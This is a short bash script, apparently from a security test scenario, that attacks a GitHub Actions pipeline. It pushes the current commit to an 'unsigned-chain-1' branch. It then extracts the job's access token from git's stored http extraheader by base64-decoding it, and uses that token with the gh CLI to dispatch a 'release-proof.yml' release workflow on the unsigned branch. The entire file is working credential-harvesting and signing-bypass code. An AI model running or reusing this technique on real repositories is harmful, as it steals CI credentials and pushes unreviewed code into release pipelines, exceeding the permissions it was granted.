#!/usr/bin/env bash
set -euo pipefail
actual=$(printf '%s' "$SYNTHETIC_REPO_SECRET" | sha256sum | cut -d' ' -f1)
test "$actual" = 6354534e0b1ee51a535b3436a3f9f765ebcb2b0c1e4b7ba6a5d7c618b316e69f
source_sha=$(git rev-parse HEAD)
git push origin HEAD:refs/heads/unsigned-chain-1
basic=$(git config --local --get-regexp '^http\..*\.extraheader$' | sed -n 's/.*basic //p')
decoded=$(printf '%s' "$basic" | base64 --decode)
token=${decoded#x-access-token:}
GH_TOKEN=$token gh api -X POST "repos/$GITHUB_REPOSITORY/actions/workflows/release-proof.yml/dispatches" -f ref=unsigned-chain-1
printf 'UNSIGNED_ARM source_sha=%s pushed and dispatched\n' "$source_sha"